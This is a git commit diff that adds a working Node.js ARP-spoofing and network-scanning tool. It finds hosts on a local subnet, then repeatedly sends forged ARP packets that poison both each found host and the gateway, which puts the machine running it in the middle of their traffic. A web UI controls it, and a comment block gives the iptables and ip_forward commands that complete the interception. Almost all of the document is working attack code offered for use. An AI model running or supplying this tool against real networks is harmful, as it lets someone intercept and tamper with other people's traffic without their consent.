b17fb1dae37946b0f25bbe7caf23e9ecd7119cd0
Nathan Fain <cyphunk@gmail.com>
2020-06-12 00:02:54 +0200

    initial arpspoof working
    still need to work on ui but arpspoofing works
    future improvements would include:
    - listen for apr requests and respond to them. all the other arpspoof tools I looked at appear to get away without responding to replies and just sending out  responses unquested as our arpspoof.js does. However, it makes sense.
    - downgrade permissions earlier

--- arpspoof.js
+++ arpspoof.js
@@ -1,6 +1,9 @@
 // arp spoofing and network scan engine
 // 
 // localhost:8082
+//
+// TODO:
+// * respond to ARP requests. Currently just spaming with arp poison packets
 
 /* 
  *
@@ -16,9 +19,11 @@
  * GLOBAL VARIABLES
  * 
  */
-const isWin   = (process.platform === 'win32')
-const isLinux = (process.platform === 'linux')
-const isOSX   = (process.platform === 'darwin')
+const isWin       = (process.platform === 'win32')
+const isLinux     = (process.platform === 'linux')
+const isOSX       = (process.platform === 'darwin')
+const spoofinterval = 4000; // send arp spoof ever N ms
+const scaninterval = 20000; // check for new hosts every N
 
 /*  END  */
 
@@ -31,14 +36,34 @@ const isOSX   = (process.platform === 'darwin')
 //     console.error('PCAP probably needs root');
 //     console.error('Will setuid/gid to owner of .js after pcap session initialized.');
 // }
-if (process.argv[2] == '--help') {
-    console.error("\nExample use: ");
-    console.error('  sudo node aprspoof.js [<eth> [<ip_range_start> <ip_range_end> [<our_ip>]]]"');
-    console.error('  if args not defined they can be set in the webui');
-    console.error('  if ip range not set will be taken from defined eth');
-    console.error('  ouriu will be skipped in range. If not defined will be taken from interface information.');
+if (process.argv.length < 4) {
+    console.error('Example use: ');
+    console.error('  sudo node aprspoof.js',
+                  '--eth <eth>',
+                  '--gateway <ip>',
+                  '[--ip-range-start <ip>',
+                   '--ip-range-end <ip>',
+                   '--our-ip <ip>] [--webui only]\n');
+    console.error('Required:');
+    console.error('  <eth>             interface to use.');
+    console.error('  <gateway>         gateway to spoof from/to');
+    console.error('Optional:');
+    console.error('  <our_ip>          determined from ip of eth if not defined');
+    console.error('  <our_macaddr>     determined from ip of eth if not defined');
+    console.error('  <ip_range_start>  determined from our_ip if not defined');
+    console.error('  <ip_range_end>    determined from our_ip if not defined');
+    console.error('  --start no        init pcap but wait for webui to start');
     process.exit(1);
 }
+// convert args to dictionary (if '-' in names then access with ['name'] rather than .name)
+let args={}
+for (let i=2;i<process.argv.length;) args[process.argv[i++].slice(2)]=process.argv[i++]
+// with bool option:
+// const boolparams = ['--boolthis','--orthat']
+// for (let i=2;i<process.argv.length;) { 
+//     v=process.argv[i++]
+//     if (boolparams.includes(v)) args[v.slice(2)]=true
+//     else args[v.slice(2)]=process.argv[i++] }
 
 /*
  * 
@@ -48,26 +73,19 @@ if (process.argv[2] == '--help') {
  * 
  */
 // Standard libs:
-// Our own libs:
-// 3rd party
-const arp = require('node-arp'); // win/lnx/osx uses exec `ping` and `arp`.
-const async = require('async');
+// Our own libs (that do not include 3rd parties):
+// 3rd party (or our libs that include 3rd party)
+const nettools = require('./nettools.js');  // win/lnx/osx uses exec `ping` and `arp`.
 /*  END  */
 
 
-function net_from_ipv4_classc(ipv4) { return ipv4.split('.').slice(0,-1).join('.')+'.0' }
-function range_from_ipv4_classc (ipv4) {
-    // retuurn start and end tuple
-    return [ ipv4.split('.').slice(0,-1).join('.')+'.1', 
-             ipv4.split('.').slice(0,-1).join('.')+'.254']
-}
-
-const requestednetinterface = process.argv[2] || null;
+const requestednetinterface = args['eth'] || null;
+const gatewayip             = args['gateway'] || null; // TODO: could replace this with the npm default-route
 let   netinterface;
-let   ip_range_start        = process.argv[3] || null;
-let   ip_range_end          = process.argv[4] || null;
-let   myip                  = process.argv[5] || null;
-
+let   ip_range_start        = args['ip-range-start'] || null;
+let   ip_range_end          = args['ip-range-end'] || null;
+let   myip                  = args['our-ip'] || null;
+let   start_now             = args['start'] && args['start'] === 'no' ? false : true;
 
 console.log('\nNetwork interfaces:');
 // linux:   {'wlan0': [{address:...},{}], {'eth0'...}}
@@ -82,8 +100,10 @@ Object.entries(require('os').networkInterfaces()).forEach(entry => {
     else
         console.log(`${devicename}`);
     if (entry[1].length > 0) {
-        if (!myip && netinterface === devicename) // assume first addr is ours
+        if (!myip && netinterface === devicename) {// assume first addr is ours
             myip = entry[1][0].address;
+            mymac = entry[1][0].mac;
+        }
         entry[1].forEach(address => {
             console.log(` ${address.address} / ${address.netmask}`) 
         });
@@ -93,15 +113,19 @@ Object.entries(require('os').networkInterfaces()).forEach(entry => {
 });
 
 if (netinterface && ! ip_range_start) {
-    [ip_range_start, ip_range_end] = range_from_ipv4_classc(myip);
+    ip_range_start = myip.split('.').slice(0,-1).join('.')+'.1', 
+    ip_range_end   = myip.split('.').slice(0,-1).join('.')+'.254'
 }
 
 
 console.log('\nSettings');
 if (netinterface) {
-    console.log(`interface : '${netinterface}'`);
-    console.log(` ip range : '${ip_range_start}' to '${ip_range_end}'`);
-    console.log(`    my ip : '${myip}'`);
+    console.log(` interface : '${netinterface}'`);
+    console.log(`  ip range : '${ip_range_start}' to '${ip_range_end}'`);
+    console.log(`     my ip : '${myip}'`);
+    console.log(`    my mac : '${mymac}'`);
+    console.log(`gateway ip : '${gatewayip}'`);
+    console.log(` start now : '${start_now}'`);
 }
 else {
     console.error(`! Couldn't not find requested interface ${requestednetinterface}`)
@@ -115,7 +139,7 @@ if (isLinux || isOSX) {
     try {
         pcap_session = pcap.createSession(netinterface, "arp");
     } catch (e) {
-        console.error('\nError: pcap could not createSession\n\n',e)
+        console.error('\nError: pcap could not createSession (permissions?)\n\n',e)
         process.exit(1)
     }
     // dowgrade permissions:
@@ -179,89 +203,257 @@ function poison_packet(ourmac, ourip, victimip, tellip) {
 }
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+// code currently appends to found_hosts so if target (e.g.phone) comes out 
+// of sleep it does not need to be re-discovered
+let found_hosts = {}; // {mac1:ip,mac2:ip}
+let recent_hosts = {}; // {mac1:ip,mac2:ip} but only last scan found
+let filter_ips = myip ? [myip] : [] // ip's to filter from webui
+let scantimer;
+let spooftimer;
+let spoofpause = false; // scanner sets this to be sure we dont respond to our own ping requests
+
+function scan1(ip_range_start, ip_range_end, filter_ips, callback) {
+    spoofpause = true; // stop spoofer so it doesnt confuse our scan
+    nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
+        spoofpause = false;
+        if (ret) {
+            found_hosts = Object.assign({}, found_hosts, ret); // add found hosts
+            recent_hosts = ret;
+        }
+        if (typeof callback === 'function')
+            callback(ret)
+    })
+}
+function scanloop(ip_range_start, ip_range_end, filter_ips, interval, callback) {
+    if (!scantimer)
+        scantimer = setInterval(() => {
+            scan1(ip_range_start, ip_range_end, filter_ips, callback)
+        }, interval);
+}
+function scanstop() { 
+    if (scantimer) {
+        clearInterval(scantimer)
+        scantimer = null
+    }
+}
+
+function spoof1(ourmac, ourip, gatewayip, targetip) {
+    send(poison_packet(ourmac, ourip, targetip, gatewayip))
+    if (gatewayip !== targetip)
+        send(poison_packet(ourmac, ourip, gatewayip, targetip))
+}
+// reads global found_hosts and spoofs each every N ms
+function spoofloop(ourmac, ourip, gatewayip, interval, callback) {
+    spoofpause = false
+    if (!spooftimer)
+        spooftimer = setInterval(() => {
+            if (!spoofpause) 
+                Object.values(found_hosts).forEach(targetip => {
+                    spoof1(ourmac,ourip,gatewayip,targetip, callback)
+                });
+        }, interval);
+}
+function spoofstop() { 
+    if (spooftimer) {
+        clearInterval(spooftimer)
+        spooftimer = null
+    }
+}
+
+
+
+let cap_session;
+
 if (isWin) {
     const cap = require('cap');
-    var cap_session = new cap.Cap();
+    cap_session = new cap.Cap();
     var buffer = Buffer.alloc(65535);
-    cap_linktype = cap_session.open(netinterface, "arp", 10 * 1024 * 1024, buffer);
-    console.log('linkType',cap_linktype)
-    cap_session.on('packet', (nbytes,trunc) => {
-        console.log('respose')
-        if (linkType === 'ETHERNET') {
-            var ret = decoders.Ethernet(buffer);
-            console.log(ret);
-        }
-    })
-    function send(packet) {
-        console.log('cap send')
-        try {
-        // send will not work if pcap_sendpacket is not supported by underlying `device`
-             c.send(packet, packet.length);
-        } catch (e) {
-            console.error("Error sending packet (cap):", e);
-        }
-    }
+    var cap_linktype = cap_session.open(netinterface, "arp", 10 * 1024 * 1024, buffer);
 }
-else {
-    // pcap_session was setup earlier in scrip while we still had root permissions
-    function send(packet){
-        console.log('pcap send')
-        try {
+// Linux/OSX: pcap_session was setup earlier in scrip while we still had root permissions
+// fyi cap/windows does not need root perms
+
+function send(packet) {
+    //console.log('cap send')
+    try {
+        if (isWin)
+            cap_session.send(packet, packet.length);
+        else 
             pcap_session.inject(packet);
-        }  catch (e) {
-            console.error("Error sending packet (pcap):", e);
-        }
+    } catch (e) {
+        console.error("Error sending packet:", e);
     }
 }
+
+
+
+
+
+if (start_now  && gatewayip && ip_range_start && ip_range_end && filter_ips && mymac && myip && gatewayip) {
+    console.log('## Starting arp spoof from shell')
+    const async = require('async');
+    async.waterfall([
+        function (callback) {
+            // run scan once, then start scanner
+            // pass through call back so we continue to next after
+            scan1(ip_range_start, ip_range_end, filter_ips, ret => {callback(null)})
+            scanloop(ip_range_start, ip_range_end, filter_ips, scaninterval)
+        },
+        function (callback) {
+            spoofloop(mymac,myip,gatewayip,spoofinterval)
+        },
+        // OLDER SIMPLER TEST ROUTINES:
+        // function (callback) {
+        //     scan1(ip_range_start,ip_range_end, myip, ret => callback('found_hosts',ret))
+        //     // OR:
+        //     // let filter_ips = [myip]
+        //     // nettools.scan(ip_range_start,ip_range_end, filter_ips, ret => {
+        //     //     callback('found_hosts',ret)
+        //     // })
+        // },
+        // function (callback) {
+        //     console.log('test one host (my phone) ')
+        //     let ourip    = myip || '192.168.178.26'
+        //     let ourmac   = '3c:a9:f4:21:00:7c'
+        //     let phoneip  = '192.168.178.23'
+        //     let phonemac = 'a4:4b:d5:a6:c1:0b'
+        //     let gwip     = '192.168.178.1'
+        //     let gwmac    = '08:96:d7:96:98:99'
+    
+        //     setInterval(() => {
+        //         process.stdout.write('.');
+        //         send(poison_packet(ourmac,ourip,phoneip,gwip))
+        //         send(poison_packet(ourmac,ourip,gwip,phoneip))    
+        //     }, arpinterval);
+        //     // callback(null)
+        // }
+    ],console.log)
+}
+
+
+console.log('## starting webui on http://localhost:8083')
+const express  = require('express')
+const app      = express();
+const server   = require('http').createServer(app);
+server.listen(8083);
+const io       = require('socket.io').listen(server);
+app.get('/', function (req, res) {
+    res.sendfile(__dirname + '/ui/arpspoof.html');
+});
+console.log('serving '+__dirname + '/ui/arpspoof.html');
+app.use('/ui', express.static(__dirname + '/ui'));
+
+io.sockets.on('connect', socket => {
+    console.log('client connected');
+
+    // this channel is whence server/admin sends commands to client (avoiding interacting with UI)
+    socket.join('arpspoof');
+
+
+    // give client all information
+    if (!Object.keys(found_hosts).length > 0)
+        socket.emit('found_hosts', found_hosts);
+    if (!Object.keys(recent_hosts).length > 0)
+        socket.emit('recent_hosts', recent_hosts);
+    if (!Object.keys(filter_ips).length > 0)
+        socket.emit('filter_ips', filter_ips);            
+
+    if (gatewayip && ip_range_start && ip_range_start && myip)
+        socket.emit('network_settings', {
+            gatewayip     : gatewayip,
+            ip_range_start: ip_range_start,
+            ip_range_end  : ip_range_end,
+            myip          : myip
+        })
+        
+    socket.on('get_found_hosts', () => {
+        console.log('get_found_hosts');
+        socket.emit('found_hosts', found_hosts);
+    })
+    socket.on('get_recent_hosts', () => {
+        console.log('get_recent_hosts');
+        socket.emit('recent_hosts', recent_hosts);
+    })
+    socket.on('get_filter_ips', () => {
+        console.log('get_filter_ips');
+        socket.emit('filter_ips', filter_ips);
+    })
+
+    socket.on('do_scan1', params => {
+        console.log('do_scan1', params);
+        scan1(params.ip_range_start, 
+                params.ip_range_end, 
+                params.filter_ips, 
+                ret => { socket.emit('recent_hosts',ret);
+        }) 
+    });
+    socket.on('start_scanloop', params => {
+        console.log('start_scanloop', params);
+        scanloop(params.ip_range_start, 
+                    params.ip_range_end, 
+                    params.filter_ips, 
+                    params.interval,
+                    ret => {
+                    io.to('arpspoof').emit('recent_hosts', ret);
+                    io.to('arpspoof').emit('found_hosts', found_hosts);
+                });
+    });
+    socket.on('stop_scanloop', scanstop);
+
+    socket.on('start_spoofloop', params => {
+        console.log('start_spoofloop', params);
+        spoofloop(params.ourmac, 
+                    params.ourip, 
+                    params.gatewayip, 
+                    params.interval)
+    });
+    socket.on('stop_spoofloop', spoofstop);
+
+    socket.on('get_spoofloop_status', ()=>{
+        var statush = spooftimer ? true : false;
+        console.log('get_spoofloop_status', status);
+        socket.emit('spoofloop_status', {
+            running: status
+        })
+    });
+
+    socket.on('set_spoof_hosts', params => {
+        console.log('set_spoof_hosts',params);
+        found_hosts = params
+    });
+});
+
+
+
 
 
 
 /*
- *
- * FEATURE METHODS
- * 
- */
-let activehosts = {};
-function find_active_hosts(callback, ipv4_start, ipv4_end, ipv4_filter) {
-    // filter is []  containing ip's we ignore. such as myip and targets we already found
-    const prefix = ipv4_start.split('.').slice(0,-1).join('.');
-    const start  = parseInt(ipv4_start.split('.').slice(-1)[0]);
-    const end    = parseInt(ipv4_end.split('.').slice(-1)[0]);
-    var count = 0;
-    for (var i = start; i <= end; i++) {
-        const ip = prefix+'.'+i;
-        if (ipv4_filter && ipv4_filter.includes(ip)) {
-            console.log(`filter out ${ip}`)
-            count += 1;
-            continue;
-        }
-        //ping and if host alive get mac
-        console.log(`try ${ip}`)
-        arp.getMAC(ip, (err, mac) => {
-            count += 1;
-            console.log(`tried ${count}: ${ip}`)
-            if (err) 
-                console.error('error arp.getMAC:',err);
-            else if (mac.split(':').length != 6)
-                console.error('mac invalid arp.getMAC:',mac);
-            else 
-                activehosts[mac] = ip;
-            if (count === (end-start)+1 && typeof callback === 'function')
-                callback(null)
-        });
-    }
-}
+SHOULD BE ENOUGH ?:
+sudo sysctl -w net.ipv4.ip_forward=1
++ sudo iptables -t nat -F
 
 
+// TRROUBLESHOOTING
++ sudo iptables -A FORWARD -i wlan0 -s 192.168.178.0/24 -m conntrack --ctstate NEW -j ACCEPT
++ sudo iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
++ sudo iptables -t nat -A POSTROUTING -j MASQUERADE
 
++ sudo sysctl -w net.ipv4.ip_forward=0
+net.ipv4.ip_forward = 0
++ sudo iptables -D FORWARD -i wlan0 -s 192.168.178.0/24 -m conntrack --ctstate NEW -j ACCEPT
++ sudo iptables -D FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
 
-async.waterfall([
-    function (callback) {
-        find_active_hosts(callback, ip_range_start,ip_range_end , [myip])
-    },
-    function (callback) {
-        console.log('activehosts',activehosts)    
-        callback(null)
-    }
-],console.log)
-
+*/
---
+++ nettools.js
@@ -0,0 +1,329 @@
+// 
+const arp          = require('node-arp'); // win/lnx/osx uses exec `ping` and `arp`.
+const dns          = require('dns');
+const multicastdns = require('multicast-dns');
+
+let mdnser; // <- initialized from mutlicast-dns on first query
+const mdnswait = 2000; // wait only this long for mdns response
+
+DEBUG = false;
+
+
+
+
+/*
+ *
+ * SCAN
+ * cb gets {mac:ip,mac2:ip2,...}
+ * 
+ */
+
+exports.scan = scan;
+exports.activehosts = {};
+function scan(ipv4_start, ipv4_end, ipv4_filter, cb) {
+    // filter is []  containing ip's we ignore. such as myip and targets we already found
+    const prefix = ipv4_start.split('.').slice(0,-1).join('.');
+    const start  = parseInt(ipv4_start.split('.').slice(-1)[0]);
+    const end    = parseInt(ipv4_end.split('.').slice(-1)[0]);
+    DEBUG && console.log(`scan prefix:${prefix} start:${start} end:${end} filter:`,ipv4_filter)
+    if (typeof ipv4_filter_optional === 'function') {
+        cb = ipv4_filter_optional
+        ipv4_filter_optional = undefined
+    }
+    let count = 0;
+    for (let i = start; i <= end; i++) {
+        const ip = prefix+'.'+i;
+        if (ipv4_filter && ipv4_filter.includes(ip)) {
+            DEBUG && console.log(`filter out ${ip}`)
+            count += 1;
+            continue;
+        }
+        //ping and if host alive get mac
+        DEBUG && console.log(`try ${ip}`)
+        arp.getMAC(ip, (err, mac) => {
+            count += 1;
+            // console.log(`tried ${count}: ${ip}`)
+            if (!err && mac && mac.split(':').length === 6)
+                exports.activehosts[mac] = ip;
+            else if (err) 
+                DEBUG && console.error(`${count}: ${ip}: error arp.getMAC:`,err);
+            else
+                DEBUG && console.error(`${count}: ${ip}: mac invalid arp.getMAC:`,mac);
+
+            if (count === (end-start)+1 && typeof cb === 'function') {
+                if (Object.keys(exports.activehosts).length > 0)
+                    cb(exports.activehosts)
+                else
+                    cb(null)
+            }
+        });
+    }
+}
+
+
+
+
+/*
+ *
+ * NAMES
+ * 
+ */
+
+function dnsreverse (ip, cb) {
+    dns.reverse(ip, (err, hostnames) => {
+        if (!err && hostnames && hostnames.length >= 1)
+            cb(hostnames[0]) //.join(", "))
+        else
+            cb(null)
+    })
+}
+// this may not work
+// query can be ip or known mdns query
+// BUGBUG: once('response') will fail if other responses found on network at same time
+function mdns (query, cb) {
+    // if not intialized already:
+    if (!mdnser) 
+        mdnser = multicastdns();
+    let q;
+    if (query.split('.').length == 4) // is ip?
+        q = query.split('.').reverse().join('.')+'.in-addr.arpa'
+    else
+        q = query;
+
+    // setup response handler:
+    // only return if we find our query
+    
+    function handleresponse (data) {
+        // console.log(data)
+        if (data && data.answers && data.answers.length >= 1) {
+            data.answers.forEach(v => {
+                // console.log(v, q)
+                if (v.name === q && typeof v.data === 'string') {
+                    cb(v.data)
+                    if (timer)
+                        clearTimeout(timer)
+                    return;
+                }
+            })
+        }
+    }
+    // wait for response but remove listener after timeout
+    let timer = setTimeout(() => { 
+        mdnser.removeListener('response', handleresponse) 
+        cb()
+    }, mdnswait)
+    
+    mdnser.once('response', handleresponse)
+
+
+    mdnser.query({ id: 0, questions: [{ name: q, type: 'ANY' }] })
+}
+// meant to combine all:
+function name (ip, cb) {
+    // to test swap function order by swaping function names
+    dnsreverse(ip, v => { 
+        if (v) 
+            cb (v)
+        else 
+            mdns(ip, v => { 
+                if (v) 
+                    cb(v) 
+                else {
+                    DEBUG && console.error(`name end: error ${ip}`)
+                    cb() // call this incase caller is counting
+                }
+            })
+    })
+}
+function names (ips, cb) {
+    var names = {}
+    var count=0;
+    ips.forEach(ip => {
+        name(ip, result => {
+            count+=1;
+            if (result)
+                names[ip] = result;
+            else
+                names[ip] = undefined;
+            if (count === ips.length)
+                cb(names)
+        })
+    })
+}
+exports.dnsreverse = dnsreverse;
+exports.mdns = mdns
+exports.name = name;
+exports.names = names;
+
+
+
+
+/*
+ *
+ * IP
+ * check is ip etc
+ * 
+ */
+
+// a collection of ip check tools
+// see tests directory for performance review of alternattives
+exports.is_local = function (str) {
+    // BUGBUG: ipv6 must be all lower case hex
+    // check on windows
+  if (str.substring(0,3) === '10.' || 
+      str.substring(0,8) === '192.168.' || 
+      str.substring(0,8) === '169.254.' ||
+      (str.substring(0,4) === '172.' && parseInt(str.substring(4,6))>>4 === 1) || //172.16to172.31 /20bit 255.240.0.0
+      str === '::1' || 
+      str === '::' ||       
+      str.substring(0,5) === 'fe80:' ||
+      (str[0] === 'f' && parseInt(str.substring(0,4)) >= 0xfc00 && parseInt(str.substring(0,4)) <=0xfdff)  
+    //   https://en.wikipedia.org/wiki/IPv6_address#Local_addresses
+     ) {
+    return true;
+  }
+  return false;
+};
+exports.is_broadcast = function (str) {
+    // stupid way
+    if (str.substr(-3) == '255')
+        return true;
+    return false;
+};
+
+// https://github.com/sindresorhus/ip-regex/blob/master/index.js
+const v4 = '(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)){3}';
+const v6seg = '[a-fA-F\\d]{1,4}';
+// important no leading spaces:
+const v6 = `
+(
+(?:${v6seg}:){7}(?:${v6seg}|:)|                                // 1:2:3:4:5:6:7::  1:2:3:4:5:6:7:8
+(?:${v6seg}:){6}(?:${v4}|:${v6seg}|:)|                         // 1:2:3:4:5:6::    1:2:3:4:5:6::8   1:2:3:4:5:6::8  1:2:3:4:5:6::1.2.3.4
+(?:${v6seg}:){5}(?::${v4}|(:${v6seg}){1,2}|:)|                 // 1:2:3:4:5::      1:2:3:4:5::7:8   1:2:3:4:5::8    1:2:3:4:5::7:1.2.3.4
+(?:${v6seg}:){4}(?:(:${v6seg}){0,1}:${v4}|(:${v6seg}){1,3}|:)| // 1:2:3:4::        1:2:3:4::6:7:8   1:2:3:4::8      1:2:3:4::6:7:1.2.3.4
+(?:${v6seg}:){3}(?:(:${v6seg}){0,2}:${v4}|(:${v6seg}){1,4}|:)| // 1:2:3::          1:2:3::5:6:7:8   1:2:3::8        1:2:3::5:6:7:1.2.3.4
+(?:${v6seg}:){2}(?:(:${v6seg}){0,3}:${v4}|(:${v6seg}){1,5}|:)| // 1:2::            1:2::4:5:6:7:8   1:2::8          1:2::4:5:6:7:1.2.3.4
+(?:${v6seg}:){1}(?:(:${v6seg}){0,4}:${v4}|(:${v6seg}){1,6}|:)| // 1::              1::3:4:5:6:7:8   1::8            1::3:4:5:6:7:1.2.3.4
+(?::((?::${v6seg}){0,5}:${v4}|(?::${v6seg}){1,7}|:))           // ::2:3:4:5:6:7:8  ::2:3:4:5:6:7:8  ::8             ::1.2.3.4
+)(%[0-9a-zA-Z]{1,})?                                           // %eth0            %1
+`.replace(/\s*\/\/.*$/gm, '').replace(/\n/g, '').trim();
+const regip6 = new RegExp(`(?:^${v4}$)|(?:^${v6}$)`)
+exports.is_ip = function (str) {
+    return regip6.test(str);
+    // return net.isIP(ip) // alternative
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+/*
+ *
+ * TEST
+ * 
+ * 
+ */
+
+
+
+
+
+
+
+function test (startip,endip) {
+    const async = require('async');
+    let hosts;
+    async.waterfall([
+        function (callback) {
+            console.log('\n## SCAN\n## args: startip,endip ');
+            scan(startip,endip, [], ret => {
+                                    hosts = ret 
+                                    console.log('scan hosts:',hosts)
+                                    callback(null);
+            })        
+        },
+        function (callback) {
+            console.log('\n## NAMES\n');
+            dnsreverse('172.217.21.238', (ret) => console.log('google dnsreverse',ret))
+            // name'172.217.21.238', (ret) => console.log('google name',ret))
+            testhosts ={'a4:4b:d5:a6:c1:0b': '192.168.178.23',
+                        'f8:d0:27:d2:f6:95': '192.168.178.32', }
+            if (hosts) testhosts = hosts
+            // this list provided by scan.js but mac not needed for testing here
+            names(Object.values(testhosts), ret => {
+                console.log('names',ret);
+                callback(null)
+            })
+            // Object.values(testhosts).forEach((v)=>{
+            //     // dnsreverse(v, (ret) => console.log(`${v} dnsreverse`,ret))
+            //     // mdns(v, (ret) => {console.log(`${v} mdns`,ret)})
+            //     namev, (ret) => console.log(`${v} name`,ret))    
+            // })
+    
+        },
+        function (callback) {
+            console.log('\n## MDNS SEARCHES\n');
+            mdnsqueries = [
+                '_smb._tcp.local',
+                '_airplay._tcp.local',
+                '_raop._tcp.local',
+                '_homekit._tcp.local',
+                '_sleep-proxy._udp.local',
+                '_companion-link._tcp.local',
+                '_ftp._tcp.local',
+                '_nfs._tcp.local',
+                '_afpovertcp._tcp.local',
+                '_sftp-ssh._tcp.local',
+                '_webdavs._tcp.local',
+                '_webdav._tcp.local'
+            ]
+            // iterate through queries, giving one every 2 seconds
+            let mdnscount = 0;
+            function checkquery (index) {
+                v=mdnsqueries[index]
+                if (v) {
+                    console.log(v)
+                    mdns(v, (ret) => {
+                        mdnscount++;
+                        if (ret)
+                            console.log(`${v} mdns response`,ret)
+                        if (mdnscount === index) // on last timeout or response
+                            callback(null)
+                    })    
+                    setTimeout(()=>{
+                        checkquery(index+1)
+                    },100)
+                }
+            }
+            checkquery(0)       
+        },
+        function (callback) {
+            console.log(__filename)
+            console.log('## test done');
+            callback();
+        }
+    ],console.log)
+}
+
+
+    
+if (process.argv.length > 2 && process.argv[2] == 'test') {
+    test(process.argv[3],process.argv[4],process.argv[5]);
+}
